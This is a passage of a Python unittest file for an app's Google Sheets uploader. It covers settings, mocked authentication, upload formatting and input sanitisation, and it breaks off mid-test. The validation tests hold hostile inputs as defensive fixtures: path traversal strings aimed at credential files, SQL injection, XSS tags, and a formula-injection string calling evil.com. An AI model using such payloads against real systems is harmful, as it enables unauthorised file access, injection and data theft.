"""
Tests for Google Sheets Integration

Verifies Google Sheets API configuration, authentication, and data upload.
"""

import unittest
from unittest.mock import Mock, patch, MagicMock, mock_open
import json
import os
import sys

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from test_helpers import TestDataGenerator, TestFileManager

# Check if Google Sheets module can be imported
# This must be done before @patch decorators are evaluated
GOOGLE_SHEETS_AVAILABLE = False
try:
    from src import google_sheets_integration

    GOOGLE_SHEETS_AVAILABLE = True
except (ImportError, ModuleNotFoundError):
    pass


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsIntegration(unittest.TestCase):
    """Test Google Sheets integration functionality"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()
        self.addCleanup(self.file_manager.cleanup)  # Ensures cleanup even if test fails

        # Create settings with Google Sheets config
        settings = TestDataGenerator.create_settings_data()
        settings["google_sheets"] = {
            "enabled": True,
            "spreadsheet_id": "test_spreadsheet_123",
            "sheet_name": "Sessions",
            "credentials_file": "credentials.json",
        }

        self.test_settings_file = self.file_manager.create_test_file(
            "test_google_settings.json", settings
        )

    def tearDown(self):
        """Clean up test files"""
        self.file_manager.cleanup()

    def test_google_sheets_settings_structure(self):
        """Test that Google Sheets settings have correct structure"""
        with open(self.test_settings_file, "r") as f:
            settings = json.load(f)

        self.assertIn("google_sheets", settings)

        google_settings = settings["google_sheets"]
        self.assertIn("enabled", google_settings)
        self.assertIn("spreadsheet_id", google_settings)
        self.assertIn("sheet_name", google_settings)
        self.assertIn("credentials_file", google_settings)

    def test_google_sheets_can_be_disabled(self):
        """Test that Google Sheets can be disabled"""
        with open(self.test_settings_file, "r") as f:
            settings = json.load(f)

        # Disable Google Sheets
        settings["google_sheets"]["enabled"] = False

        with open(self.test_settings_file, "w") as f:
            json.dump(settings, f)

        # Reload and verify
        with open(self.test_settings_file, "r") as f:
            reloaded = json.load(f)

        self.assertFalse(reloaded["google_sheets"]["enabled"])

    @patch("src.google_sheets_integration.os.path.exists")
    @patch("src.google_sheets_integration.build")
    def test_uploader_initialization(self, mock_build, mock_exists):
        """Test GoogleSheetsUploader initialization"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)

            # Verify settings loaded
            self.assertIsNotNone(uploader.settings)
            self.assertEqual(uploader.settings_file, self.test_settings_file)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.os.path.exists")
    def test_is_enabled_check(self, mock_exists):
        """Test checking if Google Sheets upload is enabled"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)
            self.assertTrue(uploader.is_enabled())

            # Test with disabled settings
            disabled_settings = TestDataGenerator.create_settings_data()
            disabled_settings["google_sheets"] = {"enabled": False}

            disabled_file = self.file_manager.create_test_file(
                "test_disabled_google.json", disabled_settings
            )

            uploader2 = GoogleSheetsUploader(disabled_file)
            self.assertFalse(uploader2.is_enabled())
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.os.path.exists")
    def test_get_spreadsheet_id(self, mock_exists):
        """Test retrieving spreadsheet ID from settings"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)
            spreadsheet_id = uploader.get_spreadsheet_id()

            self.assertEqual(spreadsheet_id, "test_spreadsheet_123")
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.os.path.exists")
    def test_get_sheet_name(self, mock_exists):
        """Test retrieving sheet name from settings"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)
            sheet_name = uploader.get_sheet_name()

            self.assertEqual(sheet_name, "Sessions")
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.os.path.exists")
    @patch("src.google_sheets_integration.build")
    @patch("builtins.open", new_callable=mock_open)
    @patch("src.google_sheets_integration.pickle.load")
    def test_authenticate_with_existing_token(
        self, mock_pickle_load, mock_file, mock_build, mock_exists
    ):
        """Test authentication when valid token exists"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Mock existing valid credentials
            mock_creds = Mock()
            mock_creds.valid = True
            mock_creds.expired = False
            mock_pickle_load.return_value = mock_creds

            # Mock file existence
            mock_exists.return_value = True

            # Mock service build
            mock_service = Mock()
            mock_build.return_value = mock_service

            uploader = GoogleSheetsUploader(self.test_settings_file)
            result = uploader.authenticate()

            self.assertTrue(result)
            self.assertIsNotNone(uploader.credentials)
            self.assertIsNotNone(uploader.service)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.os.path.exists")
    def test_authentication_fails_without_credentials_file(self, mock_exists):
        """Test that authentication fails gracefully without credentials file"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Mock that no token or credentials exist
            mock_exists.return_value = False

            uploader = GoogleSheetsUploader(self.test_settings_file)
            result = uploader.authenticate()

            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_session_data_format_for_upload(self):
        """Test that session data can be formatted for Google Sheets"""
        session_data = TestDataGenerator.create_session_data()
        session = list(session_data.values())[0]

        # Verify session has fields needed for Google Sheets
        self.assertIn("sphere", session)
        self.assertIn("date", session)
        self.assertIn("start_time", session)
        self.assertIn("end_time", session)
        self.assertIn("active_duration", session)
        self.assertIn("break_duration", session)
        self.assertIn("total_duration", session)

        # Verify active periods have project info (added during completion)
        if session["active"]:
            # In real usage, projects are added during completion
            # Here we just verify the structure is ready
            self.assertIsInstance(session["active"], list)

    @patch.dict(os.environ, {}, clear=False)
    @patch("src.google_sheets_integration.os.path.exists")
    def test_spreadsheet_id_required(self, mock_exists):
        """Test that spreadsheet ID is required for upload"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Clear any Google Sheets env vars that might interfere
            os.environ.pop("GOOGLE_SHEETS_SPREADSHEET_ID", None)
            os.environ.pop("GOOGLE_SHEETS_CREDENTIALS_FILE", None)
            os.environ.pop("GOOGLE_SHEETS_TOKEN_FILE", None)

            # Create settings without spreadsheet ID
            no_id_settings = TestDataGenerator.create_settings_data()
            no_id_settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "",  # Empty ID
                "sheet_name": "Sessions",
            }

            no_id_file = self.file_manager.create_test_file(
                "test_no_spreadsheet_id.json", no_id_settings
            )

            uploader = GoogleSheetsUploader(no_id_file)
            spreadsheet_id = uploader.get_spreadsheet_id()

            # Should return empty string
            self.assertEqual(spreadsheet_id, "")

            # Upload should not proceed without ID
            self.assertTrue(uploader.is_enabled())  # Enabled
            self.assertEqual(len(spreadsheet_id), 0)  # But no ID
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_default_sheet_name(self):
        """Test default sheet name when not specified"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Create settings without sheet_name
            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
                # No sheet_name specified
            }

            test_file = self.file_manager.create_test_file(
                "test_default_sheet.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            sheet_name = uploader.get_sheet_name()

            # Should default to "Sessions"
            self.assertEqual(sheet_name, "Sessions")
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsUploadFlow(unittest.TestCase):
    """Test complete upload flow from completion to Google Sheets"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()

    def tearDown(self):
        """Clean up test files"""
        self.file_manager.cleanup()

    def test_upload_method_exists(self):
        """Test that completion frame has upload method"""
        try:
            from src.completion_frame import CompletionFrame

            # Verify the upload method exists
            self.assertTrue(hasattr(CompletionFrame, "_upload_to_google_sheets"))
        except ImportError as e:
            self.skipTest(f"Completion frame not available: {e}")

    @patch("src.google_sheets_integration.GoogleSheetsUploader")
    def test_upload_to_google_sheets_calls_uploader(self, mock_uploader_class):
        """Test that _upload_to_google_sheets actually calls the uploader"""
        try:
            from src.completion_frame import CompletionFrame

            # Create mock uploader instance
            mock_uploader = Mock()
            mock_uploader.is_enabled.return_value = True
            mock_uploader.upload_session.return_value = True
            mock_uploader_class.return_value = mock_uploader

            # Create a mock completion frame instance with minimal setup
            frame = Mock(spec=CompletionFrame)
            frame.tracker = Mock()
            frame.tracker.settings_file = "test_settings.json"
            frame.session_name = "test_session_123"

            # Create test session data
            session_data = {
                "sphere": "Work",
                "project": "Testing",
                "date": "2024-01-20",
                "start_time": "10:00:00",
                "end_time": "10:30:00",
                "total_duration": 1800,
            }

            # Call the real method on our mock frame
            CompletionFrame._upload_to_google_sheets(frame, session_data)

            # Verify GoogleSheetsUploader was instantiated with correct settings file
            mock_uploader_class.assert_called_once_with("test_settings.json")

            # Verify is_enabled was called
            mock_uploader.is_enabled.assert_called_once()

            # Verify upload_session was called with correct parameters
            mock_uploader.upload_session.assert_called_once_with(
                session_data, "test_session_123"
            )

        except ImportError as e:
            self.skipTest(f"Completion frame not available: {e}")

    @patch("src.google_sheets_integration.GoogleSheetsUploader")
    def test_upload_skipped_when_disabled(self, mock_uploader_class):
        """Test that upload is skipped when Google Sheets is disabled"""
        try:
            from src.completion_frame import CompletionFrame

            # Create mock uploader that is disabled
            mock_uploader = Mock()
            mock_uploader.is_enabled.return_value = False
            mock_uploader_class.return_value = mock_uploader

            # Create a mock completion frame instance
            frame = Mock(spec=CompletionFrame)
            frame.tracker = Mock()
            frame.tracker.settings_file = "test_settings.json"
            frame.session_name = "test_session_123"

            # Create test session data
            session_data = {"sphere": "Work", "project": "Testing"}

            # Call the real method on our mock frame
            CompletionFrame._upload_to_google_sheets(frame, session_data)

            # Verify is_enabled was called
            mock_uploader.is_enabled.assert_called_once()

            # Verify upload_session was NOT called since disabled
            mock_uploader.upload_session.assert_not_called()

        except ImportError as e:
            self.skipTest(f"Completion frame not available: {e}")

    @patch("src.google_sheets_integration.build")
    @patch("src.google_sheets_integration.os.path.exists")
    def test_upload_session_formats_data_correctly(self, mock_exists, mock_build):
        """Test that upload_session sends correctly formatted data to Google API"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Mock the Google Sheets service
            mock_service = Mock()
            mock_spreadsheets = Mock()
            mock_values = Mock()
            mock_append = Mock()

            # Setup the mock chain: service.spreadsheets().values().append()
            mock_service.spreadsheets.return_value = mock_spreadsheets
            mock_spreadsheets.values.return_value = mock_values
            mock_values.append.return_value = mock_append
            mock_append.execute.return_value = {"updates": {"updatedCells": 23}}

            mock_build.return_value = mock_service
            mock_exists.return_value = True

            # Create uploader
            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_spreadsheet_123",
                "sheet_name": "Sessions",
            }

            test_file = self.file_manager.create_test_file(
                "test_api_format.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)

            # Mock credentials
            uploader.credentials = Mock()
            uploader.credentials.valid = True
            uploader.service = mock_service

            # Mock values.get() for header check
            mock_get = Mock()
            mock_values.get.return_value = mock_get
            mock_get.execute.return_value = {"values": [["Headers"]]}

            # Create session data with new detailed format
            session_data = {
                "date": "2024-01-20",
                "start_time": "10:00:00",
                "end_time": "10:30:00",
                "sphere": "Work",
                "total_duration": 1800,
                "active_duration": 1500,
                "break_duration": 300,
                "session_comments": {
                    "active_notes": "",
                    "break_notes": "",
                    "idle_notes": "",
                    "session_notes": "",
                },
                "active": [
                    {
                        "start": "10:00:00",
                        "end": "10:25:00",
                        "duration": 1500,
                        "project": "Testing",
                        "comment": "Working on tests",
                    }
                ],
                "breaks": [],
                "idle_periods": [],
            }

            # Upload
            result = uploader.upload_session(session_data, "test_session_123")

            # Verify the upload succeeded
            self.assertTrue(result)

            # Verify append was called with correct parameters
            mock_values.append.assert_called_once()
            call_kwargs = mock_values.append.call_args[1]

            # Verify spreadsheet ID
            self.assertEqual(call_kwargs["spreadsheetId"], "test_spreadsheet_123")

            # Verify range (sheet name)
            self.assertIn("Sessions", call_kwargs["range"])

            # Verify value input option
            self.assertEqual(call_kwargs["valueInputOption"], "USER_ENTERED")

            # Verify the data structure sent to Google
            body = call_kwargs["body"]
            self.assertIn("values", body)
            values = body["values"]
            self.assertEqual(len(values), 1)  # One row for the active period

            # Verify row contains expected data (detailed format)
            row = values[0]
            self.assertEqual(row[0], "test_session_123")  # session_id
            self.assertEqual(row[1], "2024-01-20")  # date
            self.assertEqual(row[2], "Work")  # sphere
            self.assertEqual(row[8], "active")  # type
            self.assertEqual(row[9], "Testing")  # project
            self.assertEqual(row[16], "Working on tests")  # activity_comment

        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_google_sheets_optional_dependency(self):
        """Test that app works without Google Sheets dependencies"""
        # Test that the app can handle missing Google API libraries
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # If import succeeds, verify it handles missing credentials gracefully
            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {"enabled": False}

            test_file = self.file_manager.create_test_file(
                "test_optional.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            self.assertFalse(uploader.is_enabled())
        except ImportError:
            # Expected when Google API libraries not installed
            # App should continue working without Google Sheets
            pass


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsInputValidation(unittest.TestCase):
    """Test input validation for Google Sheets integration"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()
        self.addCleanup(self.file_manager.cleanup)

    @patch.dict(os.environ, {}, clear=False)
    def test_valid_spreadsheet_id(self):
        """Test that valid spreadsheet IDs are accepted"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Clear any Google Sheets env vars that might interfere
            os.environ.pop("GOOGLE_SHEETS_SPREADSHEET_ID", None)
            os.environ.pop("GOOGLE_SHEETS_CREDENTIALS_FILE", None)
            os.environ.pop("GOOGLE_SHEETS_TOKEN_FILE", None)

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms",
                "sheet_name": "Sessions",
            }

            test_file = self.file_manager.create_test_file(
                "test_valid_id.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            spreadsheet_id = uploader.get_spreadsheet_id()

            # Should return the valid ID
            self.assertEqual(
                spreadsheet_id, "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms"
            )
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_malicious_spreadsheet_id_rejected(self):
        """Test that malicious spreadsheet IDs are rejected"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            malicious_ids = [
                "../../../etc/passwd",
                "'; DROP TABLE sessions; --",
                "<script>alert('xss')</script>",
                "../../sensitive/data",
                "C:\\Windows\\System32\\config",
            ]

            for malicious_id in malicious_ids:
                settings = TestDataGenerator.create_settings_data()
                settings["google_sheets"] = {
                    "enabled": True,
                    "spreadsheet_id": malicious_id,
                    "sheet_name": "Sessions",
                }

                test_file = self.file_manager.create_test_file(
                    "test_malicious_name.json", settings
                )

                uploader = GoogleSheetsUploader(test_file)
                spreadsheet_id = uploader.get_spreadsheet_id()

                # Should reject malicious ID and return empty string
                self.assertEqual(
                    spreadsheet_id, "", f"Failed to reject malicious ID: {malicious_id}"
                )
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_malicious_sheet_name_sanitized(self):
        """Test that malicious sheet names are sanitized"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            malicious_names = [
                "<script>alert('xss')</script>",
                "Sheet'; DROP TABLE--",
                "../../../secrets",
                "Sheet\\with\\paths",
            ]

            for malicious_name in malicious_names:
                settings = TestDataGenerator.create_settings_data()
                settings["google_sheets"] = {
                    "enabled": True,
                    "spreadsheet_id": "valid_id_123",
                    "sheet_name": malicious_name,
                }

                test_file = self.file_manager.create_test_file(
                    "test_malicious_id.json", settings
                )

                uploader = GoogleSheetsUploader(test_file)
                sheet_name = uploader.get_sheet_name()

                # Should sanitize to default "Sessions"
                self.assertEqual(
                    sheet_name,
                    "Sessions",
                    f"Failed to sanitize malicious sheet name: {malicious_name}",
                )
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_path_traversal_in_credentials_blocked(self):
        """Test that path traversal in credentials file is blocked"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            dangerous_paths = [
                "../../../etc/passwd",
                "C:\\Windows\\System32\\config\\sam",
                "~/sensitive/data.json",
                "%APPDATA%/secrets.json",
            ]

            for dangerous_path in dangerous_paths:
                settings = TestDataGenerator.create_settings_data()
                settings["google_sheets"] = {
                    "enabled": True,
                    "spreadsheet_id": "valid_id",
                    "credentials_file": dangerous_path,
                }

                test_file = self.file_manager.create_test_file(
                    "test_path_traversal.json", settings
                )

                uploader = GoogleSheetsUploader(test_file)
                # Authentication should fail for unsafe paths
                result = uploader.authenticate()
                self.assertFalse(
                    result, f"Failed to block path traversal: {dangerous_path}"
                )
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_environment_variables_override_settings(self):
        """Test that environment variables take precedence over settings file"""
        try:
            import os
            from src.google_sheets_integration import GoogleSheetsUploader

            # Set environment variable
            os.environ["GOOGLE_SHEETS_SPREADSHEET_ID"] = "env_spreadsheet_123"

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "settings_spreadsheet_456",
                "sheet_name": "Sessions",
            }

            test_file = "test_env_vars.json"
            self.file_manager.create_test_file(test_file, settings)

            uploader = GoogleSheetsUploader(test_file)
            spreadsheet_id = uploader.get_spreadsheet_id()

            # Should use environment variable, not settings file
            self.assertEqual(spreadsheet_id, "env_spreadsheet_123")

            # Cleanup
            del os.environ["GOOGLE_SHEETS_SPREADSHEET_ID"]
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestEscapeForSheets(unittest.TestCase):
    """Test formula injection prevention"""

    def test_escape_formula_injection_equals(self):
        """Test that formulas starting with = are escaped"""
        from src.google_sheets_integration import escape_for_sheets

        malicious = "=1+1"
        result = escape_for_sheets(malicious)
        self.assertEqual(result, "'=1+1")

    def test_escape_formula_injection_plus(self):
        """Test that formulas starting with + are escaped"""
        from src.google_sheets_integration import escape_for_sheets

        malicious = "+A1+A2"
        result = escape_for_sheets(malicious)
        self.assertEqual(result, "'+A1+A2")

    def test_escape_formula_injection_minus(self):
        """Test that formulas starting with - are escaped"""
        from src.google_sheets_integration import escape_for_sheets

        malicious = "-A1"
        result = escape_for_sheets(malicious)
        self.assertEqual(result, "'-A1")

    def test_escape_formula_injection_at(self):
        """Test that formulas starting with @ are escaped"""
        from src.google_sheets_integration import escape_for_sheets

        malicious = "@IMPORTDATA('http://evil.com')"
        result = escape_for_sheets(malicious)
        self.assertEqual(result, "'@IMPORTDATA('http://evil.com')")

    def test_escape_formula_injection_pipe(self):
        """Test that formulas starting with | are escaped"""
        from src.google_sheets_integration import escape_for_sheets

        malicious = "|evil"
        result = escape_for_sheets(malicious)
        self.assertEqual(result, "'|evil")

    def test_escape_html_characters(self):
        """Test that HTML/XML characters are escaped"""
        from src.google_sheets_integration import escape_for_sheets

        text = "Text with <script>alert('xss')</script>"
        result = escape_for_sheets(text)
        self.assertIn("&lt;", result)
        self.assertIn("&gt;", result)
        self.assertEqual(result, "Text with &lt;script&gt;alert('xss')&lt;/script&gt;")

    def test_escape_empty_string(self):
        """Test that empty strings are handled"""
        from src.google_sheets_integration import escape_for_sheets

        result = escape_for_sheets("")
        self.assertEqual(result, "")

    def test_escape_none(self):
        """Test that None is handled"""
        from src.google_sheets_integration import escape_for_sheets

        result = escape_for_sheets(None)
        self.assertEqual(result, "")

    def test_escape_normal_text(self):
        """Test that normal text passes through"""
        from src.google_sheets_integration import escape_for_sheets

        text = "Normal project notes"
        result = escape_for_sheets(text)
        self.assertEqual(result, text)


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsUploadSession(unittest.TestCase):
    """Test actual upload_session method"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()
        self.addCleanup(self.file_manager.cleanup)

    @patch("src.google_sheets_integration.os.path.exists")
    def test_upload_disabled_returns_false(self, mock_exists):
        """Test that upload returns False when Google Sheets disabled"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {"enabled": False}

            test_file = self.file_manager.create_test_file(
                "test_upload_disabled.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            session_data = TestDataGenerator.create_session_data()
            session = list(session_data.values())[0]

            result = uploader.upload_session(session, "test_session_123")
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.os.path.exists")
    def test_upload_no_spreadsheet_id_returns_false(self, mock_exists):
        """Test that upload returns False without spreadsheet ID"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "",  # No ID
            }

            test_file = self.file_manager.create_test_file(
                "test_upload_no_id.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            session_data = TestDataGenerator.create_session_data()
            session = list(session_data.values())[0]

            result = uploader.upload_session(session, "test_session_123")
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_upload_session_data_format(self):
        """Test that session data is formatted correctly for upload"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Create uploader with test settings
            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
                "sheet_name": "Sessions",
            }

            test_file = self.file_manager.create_test_file(
                "test_upload_format.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)

            # Without authentication, service is None
            self.assertIsNone(uploader.service)

            # Create test session with known data
            session = {
                "date": "2024-01-20",
                "start_time": "10:00:00",
                "end_time": "10:30:00",
                "sphere": "Work",
                "project": "Testing",
                "total_duration": 1800,  # 30 min in seconds
                "active_duration": 1500,  # 25 min
                "break_duration": 300,  # 5 min
                "actions": [{"time": "10:00:00"}],
                "break_actions": [{"actions": [{"time": "10:25:00"}]}],
                "notes": "Test notes",
            }

            # Upload will fail without service, but that's expected
            # This test verifies the data structure is correct
            result = uploader.upload_session(session, "session_123")

            # Should return False since we can't authenticate
            self.assertFalse(result)

            # Verify session has all required fields
            self.assertIn("date", session)
            self.assertIn("start_time", session)
            self.assertIn("sphere", session)
            self.assertIn("project", session)
            self.assertIn("total_duration", session)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsTestConnection(unittest.TestCase):
    """Test connection testing functionality"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()
        self.addCleanup(self.file_manager.cleanup)

    @patch("src.google_sheets_integration.os.path.exists")
    def test_connection_no_spreadsheet_id(self, mock_exists):
        """Test connection test fails without spreadsheet ID"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "",
            }

            test_file = self.file_manager.create_test_file(
                "test_connection_no_id.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            success, message = uploader.test_connection()

            self.assertFalse(success)
            self.assertIn("No spreadsheet ID", message)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.os.path.exists")
    @patch.dict(os.environ, {}, clear=False)
    def test_connection_success(self, mock_exists):
        """Test successful connection message format"""
        try:
            # Clear any Google Sheets env vars that might interfere
            os.environ.pop("GOOGLE_SHEETS_SPREADSHEET_ID", None)
            os.environ.pop("GOOGLE_SHEETS_CREDENTIALS_FILE", None)
            os.environ.pop("GOOGLE_SHEETS_TOKEN_FILE", None)

            from src.google_sheets_integration import GoogleSheetsUploader

            # Mock that credentials file doesn't exist to prevent authentication
            mock_exists.return_value = False

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
            }

            test_file = self.file_manager.create_test_file(
                "test_connection_success.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            success, message = uploader.test_connection()

            # Without authentication, should fail
            self.assertFalse(success)
            # Message should indicate authentication failure
            self.assertIn("Authentication", message)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsRealAPIIntegration(unittest.TestCase):
    """Integration tests with real Google Sheets API (requires credentials)"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()
        self.addCleanup(self.file_manager.cleanup)

        # Check for credentials in both project root and tests directory
        self.project_root = os.path.dirname(os.path.dirname(__file__))
        self.test_dir = os.path.dirname(__file__)

        # Try project root first, then tests directory
        if os.path.exists(os.path.join(self.project_root, "credentials.json")):
            self.credentials_path = os.path.join(self.project_root, "credentials.json")
        else:
            self.credentials_path = os.path.join(self.test_dir, "credentials.json")

        if os.path.exists(os.path.join(self.project_root, "token.pickle")):
            self.token_path = os.path.join(self.project_root, "token.pickle")
        else:
            self.token_path = os.path.join(self.test_dir, "token.pickle")

        # Load test config if environment variable not set
        if not os.environ.get("TEST_GOOGLE_SHEETS_ID"):
            test_config_path = os.path.join(
                os.path.dirname(__file__), "test_config.json"
            )
            if os.path.exists(test_config_path):
                try:
                    with open(test_config_path, "r") as f:
                        config = json.load(f)
                        if "TEST_GOOGLE_SHEETS_ID" in config:
                            os.environ["TEST_GOOGLE_SHEETS_ID"] = config[
                                "TEST_GOOGLE_SHEETS_ID"
                            ]
                except Exception:
                    pass  # Silently ignore config file errors

    @unittest.skipUnless(
        (
            os.path.exists(
                os.path.join(
                    os.path.dirname(os.path.dirname(__file__)), "credentials.json"
                )
            )
            or os.path.exists(
                os.path.join(os.path.dirname(__file__), "credentials.json")
            )
        )
        and (
            os.path.exists(
                os.path.join(os.path.dirname(os.path.dirname(__file__)), "token.pickle")
            )
            or os.path.exists(os.path.join(os.path.dirname(__file__), "token.pickle"))
        ),
        "Requires Google API credentials (credentials.json and token.pickle)",
    )
    def test_real_upload_to_google_sheets(self):
        """Integration test: Actually upload to Google Sheets (REQUIRES CREDENTIALS)"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Clear any test env vars that might interfere
            os.environ.pop("GOOGLE_SHEETS_SPREADSHEET_ID", None)
            os.environ.pop("GOOGLE_SHEETS_CREDENTIALS_FILE", None)
            os.environ.pop("GOOGLE_SHEETS_TOKEN_FILE", None)

            # Use real settings
            settings = TestDataGenerator.create_settings_data()
            # Find credentials file (check both locations)
            project_root = os.path.dirname(os.path.dirname(__file__))
            test_dir = os.path.dirname(__file__)
            if os.path.exists(os.path.join(project_root, "credentials.json")):
                creds_file = os.path.join(project_root, "credentials.json")
            else:
                creds_file = os.path.join(test_dir, "credentials.json")

            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": os.environ.get(
                    "TEST_GOOGLE_SHEETS_ID", ""
                ),  # Set in env
                "sheet_name": "Test Sessions",
                "credentials_file": creds_file,
            }

            if not settings["google_sheets"]["spreadsheet_id"]:
                self.skipTest("TEST_GOOGLE_SHEETS_ID environment variable not set")

            print(
                f"DEBUG: Using spreadsheet ID: {settings['google_sheets']['spreadsheet_id']}"
            )

            test_file = self.file_manager.create_test_file(
                "test_real_upload.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            actual_id = uploader.get_spreadsheet_id()
            print(f"DEBUG: Uploader sees spreadsheet ID: {actual_id}")

            # Create test session
            session_data = {
                "date": "2024-01-20",
                "start_time": "10:00:00",
                "end_time": "10:30:00",
                "sphere": "[TEST] Work",
                "project": "[TEST] Integration Test",
                "total_duration": 1800,
                "active_duration": 1500,
                "break_duration": 300,
            }

            # Actually upload (requires authentication)
            result = uploader.upload_session(session_data, "test_integration_123")

            # Should succeed with real credentials
            self.assertTrue(
                result, "Upload failed - check credentials and spreadsheet ID"
            )

        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @unittest.skipUnless(
        os.path.exists(
            os.path.join(os.path.dirname(os.path.dirname(__file__)), "credentials.json")
        )
        or os.path.exists(os.path.join(os.path.dirname(__file__), "credentials.json")),
        "Requires Google API credentials (credentials.json)",
    )
    def test_real_authentication(self):
        """Integration test: Test real authentication flow"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Find credentials file (check both locations)
            project_root = os.path.dirname(os.path.dirname(__file__))
            test_dir = os.path.dirname(__file__)
            if os.path.exists(os.path.join(project_root, "credentials.json")):
                creds_file = os.path.join(project_root, "credentials.json")
            else:
                creds_file = os.path.join(test_dir, "credentials.json")

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
                "credentials_file": creds_file,
            }

            test_file = self.file_manager.create_test_file(
                "test_real_auth.json", settings
            )

